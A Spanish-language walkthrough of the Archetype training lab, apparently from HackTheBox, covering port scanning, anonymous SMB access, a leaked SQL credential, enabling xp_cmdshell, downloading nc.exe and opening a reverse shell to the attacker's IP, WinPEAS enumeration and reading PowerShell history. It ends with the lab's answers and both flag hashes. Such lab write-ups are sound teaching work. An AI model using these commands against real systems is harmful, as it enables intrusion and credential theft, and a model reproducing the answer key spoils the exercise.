# Archetype

### 1. 📝 **Introducción**

* **Nivel de Dificultad**: Muy fácil.
* **Tags:**&#x20;
  * **Protocols**: Conjunto de reglas que permiten la comunicación entre sistemas.
  * **MSSQL**: Sistema de gestión de bases de datos de Microsoft.
  * **SMB**: Protocolo para compartir archivos e impresoras en redes locales.
  * **Powershell**: Shell de comandos y lenguaje de scripting para administración en Windows.
  * **Reconnaissance**: Fase de recopilación de información en evaluaciones de seguridad.
  * **Remote Code Execution**: Ejecución de código en un sistema remoto sin autorización.
  * **Clear Text Credentials**: Credenciales transmitidas sin cifrado, en texto plano.
  * **Information Disclosure**: Exposición no intencionada de información sensible.
  * **Anonymous/Guest Access**: Acceso a recursos sin necesidad de autenticación.

### 2. 🛠️ **Entorno**

Nos descargamos nuestra VPN y nos conectamos.

```
sudo openvpn nombre_del_archivo.vpn
```

Iniciamos la máquina y verificamos la conexión.

```bash
ping -c 1 10.129.187.129
```

<figure><img src="../../../.gitbook/assets/image (551).png" alt=""><figcaption></figcaption></figure>

Observamos que tenemos conexión y que es una máquina **Windows** ya que su **ttl=127**.

### 3. 🔍 **Reconocimiento**

A continuación, se realiza el comando:

```bash
nmap -p- --min-rate 5000 -sV 10.129.187.129
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../../.gitbook/assets/image (552).png" alt=""><figcaption></figcaption></figure>

### 4. 🚪 **Acceso Inicial**

Como se puede observar durante el escaneo, los **puertos 135** (msrpc), **139** (netbios-ssn) y **445** (microsoft-ds) están abiertos, indicando que hay servicios de Microsoft Windows RPC y NetBIOS en ejecución. Además, el **puerto 1433** (ms-sql-s) muestra que Microsoft SQL Server 2017 está activo. Los **puertos 5985** y **47001** están ejecutando Microsoft HTTPAPI httpd 2.0, utilizado para SSDP/UPnP. Los **puertos 49664 a 49669** también están abiertos, todos asociados a Microsoft Windows RPC. A continuación, se realizará un análisis más detallado de estos servicios.

```bash
 nmap -sV -sC -p135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669 10.129.187.129
```

<figure><img src="../../../.gitbook/assets/image (553).png" alt=""><figcaption></figcaption></figure>

En el **puerto 139**, se está ejecutando el servicio de sesión **NetBIOS**. Este servicio facilita la autenticación en un grupo de trabajo o dominio de **Windows** y proporciona acceso a recursos, como archivos e impresoras.

El **puerto 445** está destinado al protocolo Server Message Block (**SMB**), el estándar de Internet que utiliza Windows para compartir archivos, impresoras, puertos serie, entre otros.

El **puerto 1433** está asociado a **SQL Server**, lo que indica que hay una base de datos en funcionamiento en el servidor.

Dado que el protocolo **SMB** se utiliza para compartir archivos, podemos intentar conectarnos de forma anónima en busca de archivos interesantes.

```bash
smbmap -H 10.129.187.129 -u " " -p " "
```

<figure><img src="../../../.gitbook/assets/image (554).png" alt=""><figcaption></figcaption></figure>

Tenemos acceso de lectura en:

* **backups**: Es el único recurso compartido no predeterminado y no tiene un comentario, lo que podría indicar que contiene datos interesantes.
* **IPC$**: Este recurso compartido oculto es utilizado para la comunicación entre procesos. Permite la interacción con procesos que se ejecutan en el sistema remoto.

Al investigar SMB utilizando `smbclient`, conseguimos conectarnos al recurso compartido **backups** sin necesidad de autenticación.

```bash
smbclient //10.129.187.129/backups
```

<figure><img src="../../../.gitbook/assets/image (555).png" alt=""><figcaption></figcaption></figure>

> Los archivos con extensión `.dtsConfig` son archivos de configuración en sintaxis XML que se utilizan para aplicar valores de propiedades a los paquetes de SQL Server Integration Services (SSIS).

<figure><img src="../../../.gitbook/assets/image (556).png" alt=""><figcaption></figcaption></figure>

Parece ser que nos dan unas credenciales de SQL por lo que nos intentamos conectar.

```bash
python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py -windows-auth ARCHETYPE/sql_svc:M3g4c0rp123@10.129.187.129
```

<figure><img src="../../../.gitbook/assets/image (557).png" alt=""><figcaption></figcaption></figure>

¡Ahora que tenemos conexión al servidor, podemos utilizar la función `IS_SRVROLEMEMBER` para verificar si el usuario actual de SQL tiene privilegios de `sysadmin` (el nivel más alto) en el servidor SQL.

La sintaxis de la función es:

```
IS_SRVROLEMEMBER ( 'role' [ , 'login' ] )
```

Donde tenemos dos argumentos:

* **role**: Indica el rol, que puede ser uno de los siguientes:
  * sysadmin
  * serveradmin
  * dbcreator
  * setupadmin
  * bulkadmin
  * securityadmin
  * diskadmin
  * public
  * processadmin
* **login**: Nombre del servidor SQL.

En nuestra sesión de SQL Server, usaremos el siguiente comando:

```
SELECT IS_SRVROLEMEMBER('sysadmin')
```

Si la consulta es verdadera, no se obtiene ningún resultado; si es falsa, el resultado será “NULL”.

Como tenemos permisos de administrador, podemos utilizar algunas herramientas de configuración de SQL Server para habilitar una conexión remota. Empezaremos utilizando `sp_configure` para modificar algunas configuraciones globales del servidor.

La sintaxis es la siguiente:

```
sp_configure [ @configname = ] 'option_name',  
             [ @configvalue = ] { 0 | 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 }
```

Donde los argumentos son:

* **\[ @configname = ] 'option\_name'**: Es el nombre de la opción de configuración. `option_name` es de tipo `varchar(35)`, con un valor predeterminado de `NULL`.
* **\[ @configvalue = ] 'value'**: Es el nuevo valor de configuración. `value` es de tipo `int`, con un valor predeterminado de `NULL`.

Una vez que se hayan realizado los cambios en la configuración, es necesario ejecutar `RECONFIGURE` para aplicar las modificaciones.

```bash
EXEC sp_configure 'Show Advanced Options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
xp_cmdshell "whoami"
```

Podemos ver que el usuario `archetype\sql_svc` se muestra nuevamente, lo que indica que SQL Server se está ejecutando con ese usuario en Windows. El valor `NULL` aparece, lo que significa que no tiene permisos de administrador.

Nuestra shell está funcionando, pero no vamos a ejecutar nuestros comandos de esta manera nuevamente, así que vamos a obtener una shell más estable. Ahora vamos a buscar y encontrar algo.

Después de algunas búsquedas, encontramos un artículo: [https://pentestwiki.org/academy/how-to-get-a-xp\_cmdshell-reverse-shell/](https://pentestwiki.org/academy/how-to-get-a-xp\_cmdshell-reverse-shell/)

Seguiremos el último método: xp\_cmdshell con `nc`.

1. **Descargar `nc.exe` en tu sistema local**: Puedes descargar `nc.exe` desde el siguiente enlace: [https://github.com/int0x33/nc.exe/blob/master/nc.exe](https://github.com/int0x33/nc.exe/blob/master/nc.exe)
2.  **Configurar un servidor Python en tu máquina local**: Inicia un servidor HTTP en la carpeta donde se encuentra `nc.exe` con el siguiente comando:

    ```bash
    python3 -m http.server
    ```
3.  **Transferir el archivo al sistema objetivo**: Usaremos el siguiente comando en el sistema objetivo para descargar `nc.exe`:

    ```sql
    xp_cmdshell "powershell.exe wget http://10.10.16.97:8000/nc.exe -OutFile c:\\Users\\Public\\nc.exe"
    ```
4.  **Verificar la transferencia del archivo**: Si el archivo se transfiere correctamente, deberías ver algo como esto en tu instancia de servidor:

    ```bash
    Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
    10.129.187.129 - - [02/Sep/2024 19:42:04] "GET /nc.exe HTTP/1.1" 200 -
    ```
5.  **Configurar el listener de Netcat en tu máquina local**: Inicia un listener en Netcat con el siguiente comando:

    ```bash
    nc -lvnp 4444
    ```
6.  **Ejecutar el archivo `nc.exe` en el sistema objetivo**: Ejecuta el siguiente comando en el sistema objetivo para establecer la conexión inversa:

    ```sql
    xp_cmdshell "c:\\Users\\Public\\nc.exe -e cmd.exe 10.10.16.97 4444"
    ```

<figure><img src="../../../.gitbook/assets/image (558).png" alt=""><figcaption></figcaption></figure>

### 5. 🔑 **Captura de la Flag**

Una vez dentro investigamos distintos directorios para ver donde se encuentra la flag. La flag se encuentra en el directorio `/Users/sql_svc/Desktop.`

<figure><img src="../../../.gitbook/assets/image (559).png" alt=""><figcaption></figcaption></figure>

Esa es la user flag ahora falta la de root.&#x20;

<figure><img src="../../../.gitbook/assets/image (560).png" alt=""><figcaption></figcaption></figure>

**WinPEAS** es una herramienta muy útil para enumerar el sistema y encontrar debilidades. A continuación, se detalla cómo transferir y ejecutar **WinPEAS** en el sistema objetivo:

1.  **Descargar WinPEAS**

    Descarga el archivo WinPEAS desde el siguiente enlace:\
    [WinPEASx64.exe](https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe)
2.  **Configurar el Servidor Python**

    Inicia un servidor HTTP en tu máquina local para transferir el archivo. Utiliza el siguiente comando en tu terminal:

    ```bash
    python3 -m http.server
    ```

    Asegúrate de ejecutar este comando en el directorio donde se encuentra el archivo `winPEASx64.exe`.
3.  **Transferir el Archivo al Sistema Objetivo**

    Cambia a PowerShell en el sistema objetivo, ya que `cmd.exe` no dispone del comando `wget`. Ejecuta el siguiente comando para descargar el archivo:

    ```powershell
    wget http://[Tu_IP_Tun0]:8000/winPEASx64.exe -outfile winPEASx64.exe
    ```

    Reemplaza `[Tu_IP_Tun0]` con la dirección IP de tu máquina local.
4.  **Confirmar la Transferencia**

    Verifica que el archivo `winPEASx64.exe` se haya transferido correctamente al sistema objetivo, tal como hiciste anteriormente con `nc.exe`.
5.  **Ejecutar WinPEAS**

    Una vez transferido, ejecuta WinPEAS en el sistema objetivo con el siguiente comando:

    ```powershell
    powershell
    ./winPEASx64.exe
    ```

Observa el archivo llamado `ConsoleHost_history.txt`. A continuación, se detallan los pasos para navegar hasta este archivo y visualizar su contenido:

1.  **Navegar al Directorio**

    Cambia al directorio donde se encuentra el archivo ejecutando los siguientes comandos en la terminal:

    ```powershell
    cd \
    cd Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline
    ```
2.  **Mostrar el Contenido del Archivo**

    Utiliza el siguiente comando para mostrar el contenido del archivo `ConsoleHost_history.txt`:

    ```powershell
    type ConsoleHost_history.txt
    ```

<figure><img src="../../../.gitbook/assets/image (562).png" alt=""><figcaption></figcaption></figure>

### 6. ❓Preguntas

#### Tarea 1: ¿Qué puerto TCP está alojando un servidor de base de datos?

**1433**

_Es el puerto por defecto en el que Microsoft SQL Server escucha las conexiones entrantes, permitiendo la interacción con la base de datos._

#### Tarea 2: ¿Cuál es el nombre del recurso compartido no administrativo disponible a través de SMB?

**backups**

_Este recurso compartido no es uno de los predeterminados y puede contener información interesante que no está incluida en las configuraciones estándar._

#### Tarea 3: ¿Cuál es la contraseña identificada en el archivo en el recurso compartido SMB?

**M3g4c0rp123**

_La contraseña "M3g4c0rp123" fue descubierta en uno de los archivos del recurso compartido SMB, y puede ser utilizada para acceder a otras áreas protegidas del sistema._

#### Tarea 4: ¿Qué script de la colección Impacket se puede usar para establecer una conexión autenticada con un Microsoft SQL Server?

**mssqlclient.py**

_Parte de la colección Impacket, este script permite establecer conexiones autenticadas a Microsoft SQL Server, facilitando la administración remota y la explotación de la base de datos._

#### Tarea 5: ¿Qué procedimiento almacenado extendido de Microsoft SQL Server se puede usar para iniciar una shell de comandos de Windows?

**xp\_cmdshell**

_Permite ejecutar comandos del sistema operativo desde SQL Server, lo que puede ser utilizado para obtener una shell de comandos en el sistema._

#### Tarea 6: ¿Qué script se puede usar para buscar posibles rutas para escalar privilegios en hosts Windows?

**winpeas**

_Herramienta de enumeración que busca posibles rutas de escalada de privilegios en sistemas Windows, ayudando a identificar vulnerabilidades y configuraciones inseguras._

#### Tarea 7: ¿Qué archivo contiene la contraseña del administrador?

**ConsoleHost\_history.txt**

_Contiene el historial de comandos de PowerShell, en el que se puede encontrar la contraseña del administrador, proporcionando acceso adicional al sistema._

#### Tarea 8: Enviar la bandera de usuario

3e7b102e78218e935bf3f4951fec21a3

#### Tarea 9: **Enviar la bandera de root**

b91ccec3305e98240082d4474b848528

<figure><img src="../../../.gitbook/assets/image (563).png" alt=""><figcaption></figcaption></figure>
